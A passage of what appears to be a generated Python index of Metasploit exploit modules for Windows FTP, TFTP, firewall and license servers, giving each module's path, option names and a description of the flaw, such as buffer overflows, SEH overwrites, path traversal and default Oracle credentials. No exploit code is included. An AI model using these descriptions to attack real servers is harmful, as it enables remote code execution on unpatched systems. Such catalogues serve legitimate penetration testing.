			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_pcman_put(object):
		"""
		
          This module exploits a buffer overflow vulnerability found in the PUT command of the
          PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
          credientials are enabled.
      
		"""

		path = 'windows/ftp/pcman_put'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_freefloatftp_wbem(object):
		"""
		
          This module abuses multiple issues in FreeFloat: 1. No credential is actually
        needed to login; 2. User's default path is in C:/, and this cannot be changed;
        3. User can write to anywhere on the server's file system.  As a result of these
        poor implementations, a malicious user can just log in and then upload files,
        and let WMI (Management Instrumentation service) to execute the payload uploaded.
      
		"""

		path = 'windows/ftp/freefloatftp_wbem'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_ftp_easyftp_list_fixret(object):
		"""
		
          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11.
        credit goes to Karn Ganeshan.

        NOTE: Although, this is likely to exploit the same vulnerability as the
        'easyftp_cwd_fixret' exploit, it uses a slightly different vector.
      
		"""

		path = 'windows/ftp/easyftp_list_fixret'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_wsftp_server_503_mkd(object):
		"""
		
        This module exploits the buffer overflow found in the MKD
        command in IPSWITCH WS_FTP Server 5.03 discovered by Reed
        Arvin.
      
		"""

		path = 'windows/ftp/wsftp_server_503_mkd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_pcman_stor(object):
		"""
		
          This module exploits a buffer overflow vulnerability found in the STOR command of the
          PCMAN FTP v2.07 Server when the "/../" parameters are also sent to the server. Please
          note authentication is required in order to trigger the vulnerability. The overflowing
          string will also be seen on the FTP server log console.
      
		"""

		path = 'windows/ftp/pcman_stor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_vermillion_ftpd_port(object):
		"""
		
          This module exploits an out-of-bounds array access in the Arcane Software
        Vermillion FTP server. By sending an specially crafted FTP PORT command,
        an attacker can corrupt stack memory and execute arbitrary code.

        This particular issue is caused by processing data bound by attacker
        controlled input while writing into a 4 byte stack buffer. Unfortunately,
        the writing that occurs is not a simple byte copy.

        Processing is done using a source ptr (p) and a destination pointer (q).
        The vulnerable function walks the input string and continues while the
        source byte is non-null. If a comma is encountered, the function increments
        the the destination pointer. If an ascii digit [0-9] is encountered, the
        following occurs:

          *q = (*q * 10) + (*p - '0');

        All other input characters are ignored in this loop.

        As a consequence, an attacker must craft input such that modifications
        to the current values on the stack result in usable values. In this exploit,
        the low two bytes of the return address are adjusted to point at the
        location of a 'call edi' instruction within the binary. This was chosen
        since 'edi' points at the source buffer when the function returns.

        NOTE: This server can be installed as a service using "vftpd.exe install".
        If so, the service does not restart automatically, giving an attacker only
        one attempt.
      
		"""

		path = 'windows/ftp/vermillion_ftpd_port'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_kmftp_utility_cwd(object):
		"""
		
          This module exploits an SEH overflow in Konica Minolta FTP Server 1.00.
        Konica Minolta FTP fails to check input size when parsing 'CWD' commands, which
        leads to an SEH overflow.  Konica FTP allows anonymous access by default; valid
        credentials are typically unnecessary to exploit this vulnerability.
      
		"""

		path = 'windows/ftp/kmftp_utility_cwd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_ftp_aasync_list_reply(object):
		"""
		
          This module exploits a stack buffer overflow in AASync v2.2.1.0, triggered when
        processing the response on a LIST command. During the overflow, a structured exception
        handler record gets overwritten.
      
		"""

		path = 'windows/ftp/aasync_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_oracle9i_xdb_ftp_unlock(object):
		"""
		
          By passing an overly long token to the UNLOCK command, a
        stack based buffer overflow occurs. David Litchfield, has
        illustrated multiple vulnerabilities in the Oracle 9i XML
        Database (XDB), during a seminar on "Variations in exploit
        methods between Linux and Windows" presented at the Blackhat
        conference. Oracle9i includes a number of default accounts,
        including dbsnmp:dbsmp, scott:tiger, system:manager, and
        sys:change_on_install.
      
		"""

		path = 'windows/ftp/oracle9i_xdb_ftp_unlock'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_ftp_3cdaemon_ftp_user(object):
		"""
		
          This module exploits a vulnerability in the 3Com 3CDaemon
        FTP service. This package is being distributed from the 3Com
        web site and is recommended in numerous support documents.
        This module uses the USER command to trigger the overflow.
      
		"""

		path = 'windows/ftp/3cdaemon_ftp_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_ftp_scriptftp_list(object):
		"""
		
        AmmSoft's ScriptFTP client is susceptible to a remote buffer overflow
        vulnerability that is triggered when processing a sufficiently long
        filename during a FTP LIST command resulting in overwriting the
        exception handler. Social engineering of executing a specially crafted
        ftp file by double click will result in connecting to our malcious
        server and perform arbitrary code execution which allows the attacker to
        gain the same rights as the user running ScriptFTP. This vulnerability
        affects versions 3.3 and earlier.
      
		"""

		path = 'windows/ftp/scriptftp_list'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'
			required_FILENAME = 'FILENAME'

	class windows_ftp_freeftpd_pass(object):
		"""
		
        freeFTPd 1.0.10 and below contains an overflow condition that is triggered as
        user-supplied input is not properly validated when handling a specially crafted
        PASS command. This may allow a remote attacker to cause a buffer overflow,
        resulting in a denial of service or allow the execution of arbitrary code.

        FreeFTPd must have an account set to authorization anonymous user account.
      
		"""

		path = 'windows/ftp/freeftpd_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPUSER = 'FTPUSER'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_firewall_blackice_pam_icq(object):
		"""
		
          This module exploits a stack buffer overflow in the ISS products that use
        the iss-pam1.dll ICQ parser (Blackice/RealSecure). Successful exploitation
        will result in arbitrary code execution as LocalSystem. This exploit
        only requires 1 UDP packet, which can be both spoofed and sent to a broadcast
        address.

        The ISS exception handler will recover the process after each overflow, giving
        us the ability to bruteforce the service and exploit it multiple times.
      
		"""

		path = 'windows/firewall/blackice_pam_icq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_firewall_kerio_auth(object):
		"""
		
        This module exploits a stack buffer overflow in Kerio Personal Firewall
        administration authentication process. This module has only been tested
        against Kerio Personal Firewall 2 (2.1.4).
      
		"""

		path = 'windows/firewall/kerio_auth'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_tftp_quick_tftp_pro_mode(object):
		"""
		
          This module exploits a stack buffer overflow in the Quick TFTP Pro server
        product. MS Update KB926436 screws up the opcode address being used in oledlg.dll resulting
        in a DoS.  This is a port of a sploit by Mati "muts" Aharoni.
      
		"""

		path = 'windows/tftp/quick_tftp_pro_mode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_tftp_threectftpsvc_long_mode(object):
		"""
		
          This module exploits a stack buffer overflow in 3CTftpSvc 2.0.1. By
        sending a specially crafted packet with an overly long mode
        field, a remote attacker could overflow a buffer and execute
        arbitrary code on the system.
      
		"""

		path = 'windows/tftp/threectftpsvc_long_mode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_futuresoft_transfermode(object):
		"""
		
          This module exploits a stack buffer overflow in the FutureSoft TFTP Server
        2000 product. By sending an overly long transfer-mode string, we were able
        to overwrite both the SEH and the saved EIP. A subsequent write-exception
        that will occur allows the transferring of execution to our shellcode
        via the overwritten SEH. This module has been tested against Windows
        2000 Professional and for some reason does not seem to work against
        Windows 2000 Server (could not trigger the overflow at all).
      
		"""

		path = 'windows/tftp/futuresoft_transfermode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_tftp_opentftp_error_code(object):
		"""
		
          This module exploits a buffer overflow in OpenTFTP Server SP 1.4.  The vulnerable
        condition triggers when the TFTP opcode is configured as an error packet, the TFTP
        service will then format the message using a sprintf() function, which causes an
        overflow, therefore allowing remote code execution under the context of SYSTEM.

          The offset (to EIP) is specific to how the TFTP was started (as a 'Stand Alone',
        or 'Service').  By default the target is set to 'Service' because that's the default
        configuration during OpenTFTP Server SP 1.4's installation.
      
		"""

		path = 'windows/tftp/opentftp_error_code'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_tftpdwin_long_filename(object):
		"""
		
          This module exploits the ProSysInfo TFTPDWIN threaded TFTP Server. By sending
        an overly long file name to the tftpd.exe server, the stack can be overwritten.
      
		"""

		path = 'windows/tftp/tftpdwin_long_filename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_distinct_tftp_traversal(object):
		"""
		
          This module exploits a vulnerability found in Distinct TFTP server.  The
        software contains a directory traversal vulnerability that allows a remote
        attacker to write arbitrary file to the file system, which results in
        code execution under the context of 'SYSTEM'.
      
		"""

		path = 'windows/tftp/distinct_tftp_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			DEPTH = 'DEPTH'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'

	class windows_tftp_tftpserver_wrq_bof(object):
		"""
		
          This module exploits a vulnerability found in TFTP Server 1.4 ST.  The flaw
        is due to the way TFTP handles the filename parameter extracted from a WRQ request.
        The server will append the user-supplied filename to TFTP server binary's path
        without any bounds checking, and then attempt to check this path with a fopen().
        Since this isn't a valid file path, fopen() returns null, which allows the
        corrupted data to be used in a strcmp() function, causing an access violation.

        Since the offset is sensitive to how the TFTP server is launched, you must know
        in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone'
        , and then manually select your target accordingly. A successful attempt will lead
        to remote code execution under the context of SYSTEM if run as a service, or
        the user if run as a standalone. A failed attempt will result a denial-of-service.
      
		"""

		path = 'windows/tftp/tftpserver_wrq_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_netdecision_tftp_traversal(object):
		"""
		
          This module exploits a vulnerability found in NetDecision 4.2 TFTP server. The
        software contains a directory traversal vulnerability that allows a remote attacker
        to write arbitrary file to the file system, which results in code  execution under
        the context of user executing the TFTP Server.
      
		"""

		path = 'windows/tftp/netdecision_tftp_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			DEPTH = 'DEPTH'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'

	class windows_tftp_tftpd32_long_filename(object):
		"""
		
          This module exploits a stack buffer overflow in TFTPD32 version 2.21
        and prior. By sending a request for an overly long file name
        to the tftpd32 server, a remote attacker could overflow a buffer and
        execute arbitrary code on the system.
      
		"""

		path = 'windows/tftp/tftpd32_long_filename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_dlink_long_filename(object):
		"""
		
          This module exploits a stack buffer overflow in D-Link TFTP 1.0.
        By sending a request for an overly long file name, an attacker
        could overflow a buffer and execute arbitrary code. For best results,
        use bind payloads with nonx (No NX).
      
		"""

		path = 'windows/tftp/dlink_long_filename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_tftp_attftp_long_filename(object):
		"""
		
          This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a
        request (get/write) for an overly long file name.
      
		"""

		path = 'windows/tftp/attftp_long_filename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_LHOST = 'LHOST'

	class windows_license_calicclnt_getconfig(object):
		"""
		
          This module exploits an vulnerability in the CA License Client
        service. This exploit will only work if your IP address can be
        resolved from the target system point of view. This can be
        accomplished on a local network by running the 'nmbd' service
        that comes with Samba. If you are running this exploit from
        Windows and do not filter udp port 137, this should not be a
        problem (if the target is on the same network segment). Due to
        the bugginess of the software, you are only allowed one connection
        to the agent port before it starts ignoring you. If it wasn't for this
        issue, it would be possible to repeatedly exploit this bug.
      
		"""

		path = 'windows/license/calicclnt_getconfig'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SRVPORT = 'SRVPORT'

	class windows_license_sentinel_lm7_udp(object):
		"""
		
          This module exploits a simple stack buffer overflow in the Sentinel
        License Manager. The SentinelLM service is installed with a
        wide selection of products and seems particular popular with
        academic products. If the wrong target value is selected,
        the service will crash and not restart.
      
		"""

		path = 'windows/license/sentinel_lm7_udp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_license_calicserv_getconfig(object):
		"""
		
          This module exploits an vulnerability in the CA License Server
        network service. By sending an excessively long GETCONFIG
        packet the stack may be overwritten.
      
		"""

		path = 'windows/license/calicserv_getconfig'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_license_flexnet_lmgrd_bof(object):
		"""
		
          This module exploits a vulnerability in the FlexNet
        License Server Manager.

        The vulnerability is due to the insecure usage of memcpy
        in the lmgrd service when handling network packets, which
        results in a stack buffer overflow.

        In order to improve reliability, this module will make lots of
        connections to lmgrd during each attempt to maximize its success.
      
		"""

		path = 'windows/license/flexnet_lmgrd_bof'
